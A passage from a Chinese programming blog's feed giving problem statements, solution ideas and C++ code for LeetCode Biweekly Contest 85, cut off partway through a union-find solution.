class="number">0</span>][j | (<span class="number">1</span> &lt;&lt; k)] += dp[i<span class="number">-1</span>][<span class="number">0</span>][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">1024</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[m][<span class="number">0</span>][i] &gt; <span class="number">0</span> || dp[m][<span class="number">1</span>][i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                tot += dp[m][<span class="number">0</span>][i] + dp[m][<span class="number">1</span>][i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  biweekly contest 85</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/25/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-85"><a href="#leetcode-biweekly-contest-85" class="headerlink" title="leetcode  biweekly contest 85"></a>leetcode  biweekly contest 85</h2><p>双周赛的质量又好起来了，前几周的题目质量水平下降严重，本周开始质量好很多了。</p>
<h4 id="6156-得到-K-个黑块的最少涂色次数"><a href="#6156-得到-K-个黑块的最少涂色次数" class="headerlink" title="6156. 得到 K 个黑块的最少涂色次数"></a><a href="https://leetcode.cn/problems/minimum-recolors-to-get-k-consecutive-black-blocks/">6156. 得到 K 个黑块的最少涂色次数</a></h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个长度为 <code>n</code> 下标从 <code>0</code> 开始的字符串 <code>blocks</code> ，<code>blocks[i]</code> 要么是 <code>&#39;W&#39; </code>要么是<code> &#39;B&#39;</code> ，表示第<code>i</code>块的颜色。字符<code>&#39;W&#39;</code>和<code>&#39;B&#39;</code>分别表示白色和黑色。</p>
<p>给你一个整数 <code>k </code>，表示想要 连续 黑色块的数目。</p>
<p>每一次操作中，你可以选择一个白色块将它 涂成 黑色块。</p>
<p>请你返回至少出现 一次 连续 <code>k</code> 个黑色块的 最少 操作次数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：blocks = &quot;WBBWWBBWBW&quot;, k = 7</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">一种得到 7 个连续黑色块的方法是把第 0 ，3 和 4 个块涂成黑色。</span><br><span class="line">得到 blocks = &quot;BBBBBBBWBW&quot; 。</span><br><span class="line">可以证明无法用少于 3 次操作得到 7 个连续的黑块。</span><br><span class="line">所以我们返回 3 。</span><br></pre></td></tr></table></figure>



<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：blocks = &quot;WBWBBBW&quot;, k = 2</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">不需要任何操作，因为已经有 2 个连续的黑块。</span><br><span class="line">所以我们返回 0 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line"></span><br><span class="line">n == blocks.length</span><br><span class="line">1 &lt;= n &lt;= 100</span><br><span class="line">blocks[i] 要么是 &#x27;W&#x27; ，要么是 &#x27;B&#x27; 。</span><br><span class="line">1 &lt;= k &lt;= n</span><br></pre></td></tr></table></figure>




<p>提示：</p>
<ul>
<li><code>n == blocks.length</code></li>
<li><code>1 &lt;= n &lt;= 100</code></li>
<li><code>blocks[i] </code>要么是 <code>&#39;W&#39;</code> ，要么是 <code>&#39;B&#39; </code>。</li>
<li><code>1 &lt;= k &lt;= n</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-recolors-to-get-k-consecutive-black-blocks">https://leetcode.cn/problems/minimum-recolors-to-get-k-consecutive-black-blocks</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>滑动窗口
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接采用滑动窗口找到 $k$ 个长度 中黑色方块 ，找到连续的 $k$ 个长度中白色块最少的即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中  $n$ 表示字符串的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul>
<li>滑动窗口<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumRecolors</span><span class="params">(string blocks, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = blocks.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = n;</span><br><span class="line">        <span class="type">int</span> whiteCnt = <span class="number">0</span>, blackCnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (blocks[i] == <span class="string">&#x27;W&#x27;</span>) &#123;</span><br><span class="line">                whiteCnt++;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) &#123;</span><br><span class="line">                ans = <span class="built_in">min</span>(ans, whiteCnt);</span><br><span class="line">                <span class="keyword">if</span> (blocks[i - k + <span class="number">1</span>] == <span class="string">&#x27;W&#x27;</span>) &#123;</span><br><span class="line">                    whiteCnt--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6157-二进制字符串重新安排顺序需要的时间"><a href="#6157-二进制字符串重新安排顺序需要的时间" class="headerlink" title="6157. 二进制字符串重新安排顺序需要的时间"></a><a href="https://leetcode.cn/problems/time-needed-to-rearrange-a-binary-string/">6157. 二进制字符串重新安排顺序需要的时间</a></h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个二进制字符串 <code>s</code> 。在一秒之中，所有 子字符串 <code>&quot;01&quot;</code> 同时 被替换成 <code>&quot;10&quot;</code> 。这个过程持续进行到没有 <code>&quot;01&quot; </code>存在。</p>
<p>请你返回完成这个过程所需要的秒数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;0110101&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">一秒后，s 变成 &quot;1011010&quot; 。</span><br><span class="line">再过 1 秒后，s 变成 &quot;1101100&quot; 。</span><br><span class="line">第三秒过后，s 变成 &quot;1110100&quot; 。</span><br><span class="line">第四秒后，s 变成 &quot;1111000&quot; 。</span><br><span class="line">此时没有 &quot;01&quot; 存在，整个过程花费 4 秒。</span><br><span class="line">所以我们返回 4 。</span><br></pre></td></tr></table></figure>

<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;11100&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">s 中没有 &quot;01&quot; 存在，整个过程花费 0 秒。</span><br><span class="line">所以我们返回 0 。</span><br></pre></td></tr></table></figure>


<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s[i] </code>要么是<code>&#39;0&#39;</code>，要么是<code> &#39;1&#39;</code> 。</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/time-needed-to-rearrange-a-binary-string">https://leetcode.cn/problems/time-needed-to-rearrange-a-binary-string</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟或者思维
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接模拟就非常简单，我们可以观察到直接模拟的时间复杂度不超过 $n^2$，因此我们可以直接模拟即可，知道字符串中没有字符串 <code>01</code> 出现即可。</li>
<li>动态规划，本质上讲右侧的 $1$ 往左侧移动，如果 $1$  前面有连续的 $0$ ,则可以讲其一直向左移动直到左侧为  $1$  为止，此时需要等待。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示节点的数目。</li>
<li>空间复杂度：$O(n)$，$n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><ul>
<li>直接模拟：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">secondsToRemoveOccurrences</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">bool</span> valid = <span class="literal">false</span>;</span><br><span class="line">            <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(pos &lt; n - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(s[pos] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[pos + <span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                    s[pos] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                    s[pos + <span class="number">1</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    pos += <span class="number">2</span>;</span><br><span class="line">                    valid = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    pos++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(valid)&#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>动态规划：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">secondsToRemoveOccurrences</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                ++cnt;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans + <span class="number">1</span>, cnt);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6158-字母移位-II"><a href="#6158-字母移位-II" class="headerlink" title="6158. 字母移位 II"></a>6158. 字母移位 II</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个小写英文字母组成的字符串 <code>s</code> 和一个二维整数数组 <code>shifts</code> ，其中 <code>shifts[i] = [starti, endi, directioni]</code> 。对于每个 <code>i</code> ，将 <code>s</code> 中从下标 <code>starti</code> 到下标 <code>endi</code> （两者都包含）所有字符都进行移位运算，如果 <code>directioni = 1</code> 将字符向后移位，如果 <code>directioni = 0</code> 将字符向前移位。</p>
<p>将一个字符 <strong>向后</strong> 移位的意思是将这个字符用字母表中 <strong>下一个</strong> 字母替换（字母表视为环绕的，所以 <code>&#39;z&#39;</code> 变成 <code>&#39;a&#39;</code>）。类似的，将一个字符 <strong>向前</strong> 移位的意思是将这个字符用字母表中 <strong>前一个</strong> 字母替换（字母表是环绕的，所以 <code>&#39;a&#39;</code> 变成 <code>&#39;z&#39;</code> ）。</p>
<p>请你返回对 <code>s</code> 进行所有移位操作以后得到的最终字符串。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abc&quot;, shifts = [[0,1,0],[1,2,1],[0,2,1]]</span><br><span class="line">输出：&quot;ace&quot;</span><br><span class="line">解释：首先，将下标从 0 到 1 的字母向前移位，得到 s = &quot;zac&quot; 。</span><br><span class="line">然后，将下标从 1 到 2 的字母向后移位，得到 s = &quot;zbd&quot; 。</span><br><span class="line">最后，将下标从 0 到 2 的字符向后移位，得到 s = &quot;ace&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;dztz&quot;, shifts = [[0,0,0],[1,1,1]]</span><br><span class="line">输出：&quot;catz&quot;</span><br><span class="line">解释：首先，将下标从 0 到 0 的字母向前移位，得到 s = &quot;cztz&quot; 。</span><br><span class="line">最后，将下标从 1 到 1 的字符向后移位，得到 s = &quot;catz&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length, shifts.length &lt;= 5 * 104</code></li>
<li><code>shifts[i].length == 3</code></li>
<li><code>0 &lt;= starti &lt;= endi &lt; s.length</code></li>
<li><code>0 &lt;= directioni &lt;= 1</code></li>
<li><code>s</code> 只包含小写英文字母。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-85/problems/shifting-letters-ii/">https://leetcode.cn/contest/biweekly-contest-85/problems/shifting-letters-ii/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>差分数组或者线段树
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>线段树的解法就非常暴力，没啥好讲的，需要 <code>lazy</code> 节点之类的，比较麻烦。查分数组的思路就非常简单，直接讲每个区间 $[l,r]$ ,在 $l，r+1$ 处进行进行标记即可，统计时依次统计即可。</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(m + n)$，其中  $m$ 为 $shift$ 数组的长度，$n$ 为字符串的长度。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 表示字符串的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">shiftingLetters</span><span class="params">(string s, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; shifts)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = shifts.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (shifts[i][<span class="number">2</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">                cnt[shifts[i][<span class="number">0</span>]]--;</span><br><span class="line">                cnt[shifts[i][<span class="number">1</span>] + <span class="number">1</span>]++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cnt[shifts[i][<span class="number">0</span>]]++;</span><br><span class="line">                cnt[shifts[i][<span class="number">1</span>] + <span class="number">1</span>]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            curr += cnt[i];</span><br><span class="line">            s[i] = <span class="string">&#x27;a&#x27;</span> + (s[i] - <span class="string">&#x27;a&#x27;</span> + curr%<span class="number">26</span> + <span class="number">26</span>)%<span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h3 id="6159-删除操作后的最大子段和"><a href="#6159-删除操作后的最大子段和" class="headerlink" title="6159. 删除操作后的最大子段和"></a>6159. 删除操作后的最大子段和</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你两个下标从 <strong>0</strong> 开始的整数数组 <code>nums</code> 和 <code>removeQueries</code> ，两者长度都为 <code>n</code> 。对于第 <code>i</code> 个查询，<code>nums</code> 中位于下标 <code>removeQueries[i]</code> 处的元素被删除，将 <code>nums</code> 分割成更小的子段。</p>
<p>一个 <strong>子段</strong> 是 <code>nums</code> 中连续 <strong>正</strong> 整数形成的序列。<strong>子段和</strong> 是子段中所有元素的和。</p>
<p>请你返回一个长度为 <code>n</code> 的整数数组 <code>answer</code> ，其中 <code>answer[i]</code>是第 <code>i</code> 次删除操作以后的 <strong>最大</strong> 子段和。</p>
<p><strong>注意：</strong>一个下标至多只会被删除一次。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,5,6,1], removeQueries = [0,3,2,4,1]</span><br><span class="line">输出：[14,7,2,2,0]</span><br><span class="line">解释：用 0 表示被删除的元素，答案如下所示：</span><br><span class="line">查询 1 ：删除第 0 个元素，nums 变成 [0,2,5,6,1] ，最大子段和为子段 [2,5,6,1] 的和 14 。</span><br><span class="line">查询 2 ：删除第 3 个元素，nums 变成 [0,2,5,0,1] ，最大子段和为子段 [2,5] 的和 7 。</span><br><span class="line">查询 3 ：删除第 2 个元素，nums 变成 [0,2,0,0,1] ，最大子段和为子段 [2] 的和 2 。</span><br><span class="line">查询 4 ：删除第 4 个元素，nums 变成 [0,2,0,0,0] ，最大子段和为子段 [2] 的和 2 。</span><br><span class="line">查询 5 ：删除第 1 个元素，nums 变成 [0,0,0,0,0] ，最大子段和为 0 ，因为没有任何子段存在。</span><br><span class="line">所以，我们返回 [14,7,2,2,0] 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,2,11,1], removeQueries = [3,2,1,0]</span><br><span class="line">输出：[16,5,3,0]</span><br><span class="line">解释：用 0 表示被删除的元素，答案如下所示：</span><br><span class="line">查询 1 ：删除第 3 个元素，nums 变成 [3,2,11,0] ，最大子段和为子段 [3,2,11] 的和 16 。</span><br><span class="line">查询 2 ：删除第 2 个元素，nums 变成 [3,2,0,0] ，最大子段和为子段 [3,2] 的和 5 。</span><br><span class="line">查询 3 ：删除第 1 个元素，nums 变成 [3,0,0,0] ，最大子段和为子段 [3] 的和 3 。</span><br><span class="line">查询 5 ：删除第 0 个元素，nums 变成 [0,0,0,0] ，最大子段和为 0 ，因为没有任何子段存在。</span><br><span class="line">所以，我们返回 [16,5,3,0] 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums.length == removeQueries.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
<li><code>0 &lt;= removeQueries[i] &lt; n</code></li>
<li><code>removeQueries</code> 中所有数字 <strong>互不相同</strong> 。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-85/problems/maximum-segment-sum-after-removals/">https://leetcode.cn/contest/biweekly-contest-85/problems/maximum-segment-sum-after-removals/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>二分查找或者并查集
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接模拟的思路非常简单，也非常暴力。直接按照题目思路要求，每次将分段进行拆分即可。我们用一个 <code>treemap</code>  保存所有的分段信息，用一个 <code>treemap</code> 保存当前所有数组的中的分段和的统计。每次我们在 <code>treemap</code> 中查找给定的区间 $[x,x]$ 匹配的分段 $[l,r]$ ，然后将分段拆分成 $[l,x-1],[x+1,r]$ ,并从 <code>map</code> 中删除分段 $[l,r]$, 在  <code>treemap</code> 删除 $sum[l,r]$, 并同时添加 $sum[l,x-1], sum[x+1,r]$, 非常简单的模拟即可。</li>
</ol>
<ul>
<li><p>时间复杂度：$O(m \log m)$，其中 $m$ 表示数组的长度。</p>
</li>
<li><p>空间复杂度：$O(m)$，其中 $m$ 表示数组的长度。</p>
</li>
</ul>
<ol start="2">
<li>典型的并查集的操作。我们从后往前恢复数组，就可以看到实际为该数组的恢复过程，此时就联想到用并查集，思路非常简单，感觉是个经典题目，虽然不是特别难的题目。每次恢复 $x$ 时：</li>
</ol>
<ul>
<li>查看 $x$ 的左边位置 $x-1$ 是否已经恢复，如果已经恢复，则将两个位置进行合并；</li>
<li>查看 $x$ 的右边位置 $x+1$ 是否已经恢复，如果已经恢复，则将两个位置进行合并；</li>
<li>每次查询集合 $x$ 所在的集合的元素的和，更新当前的最大值即可；</li>
</ul>
<p>时间复杂度分析：</p>
<ul>
<li>时间复杂度：$O(n \times \alpha(n))$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ul>
<li>二分查找<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">maximumSegmentSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; removeQueries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum[i+<span class="number">1</span>] = sum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        map&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;, <span class="type">long</span> <span class="type">long</span>&gt; cnt;</span><br><span class="line">        map&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; now;</span><br><span class="line">        cnt[<span class="built_in">make_pair</span>(n<span class="number">-1</span>, <span class="number">0</span>)] = sum[n];</span><br><span class="line">        now[sum[n]]++;</span><br><span class="line">        <span class="type">int</span> m = removeQueries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">ans</span><span class="params">(m)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = removeQueries[i];</span><br><span class="line">            <span class="keyword">auto</span> it = cnt.<span class="built_in">lower_bound</span>(&#123;x,<span class="number">0</span>&#125;);</span><br><span class="line">            <span class="type">int</span> r = it-&gt;first.first;</span><br><span class="line">            <span class="type">int</span> l = it-&gt;first.second;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> s = it-&gt;second;</span><br><span class="line">            cnt.<span class="built_in">erase</span>(it);</span><br><span class="line">            now[s]--;</span><br><span class="line">            <span class="keyword">if</span>(now[s] == <span class="number">0</span>) &#123;</span><br><span class="line">                now.<span class="built_in">erase</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x &gt; l) &#123;</span><br><span class="line">                cnt[<span class="built_in">make_pair</span>(x - <span class="number">1</span>, l)] = sum[x] - sum[l];</span><br><span class="line">                now[sum[x] - sum[l]]++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x &lt; r) &#123;</span><br><span class="line">                cnt[<span class="built_in">make_pair</span>(r, x + <span class="number">1</span>)] = sum[r+<span class="number">1</span>] - sum[x+<span class="number">1</span>];</span><br><span class="line">                now[sum[r+<span class="number">1</span>] - sum[x+<span class="number">1</span>]]++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans[i] = now.<span class="built_in">rbegin</span>()-&gt;first;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>并查集<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;f, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (x != f[x]) &#123;</span><br><span class="line">            x = f[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">uni</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;f, vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; &amp;sum, <span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> fx = <span class="built_in">find</span>(f, x);</span><br><span class="line">        <span class="type">int</span> fy = <span class="built_in">find</span>(f, y);</span><br><span class="line">        f[fx] = fy;</span><br><span class="line">        sum[fy] += sum[fx];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">maximumSegmentSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; removeQueries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">fa</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">ans</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            ans[i] = curr;</span><br><span class="line">            <span class="type">int</span> x = removeQueries[i];</span><br><span class="line">            fa[x] = x;</span><br><span class="line">            sum[x] = nums[x];</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; fa[x - <span class="number">1</span>] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">uni</span>(fa, sum, x, x - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x + <span class="number">1</span> &lt; n &amp;&amp; fa[x + <span class="number">1</span>] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">uni</span>(fa, sum, x, x + <span class="number">1</span>);</span><br><span class="line">            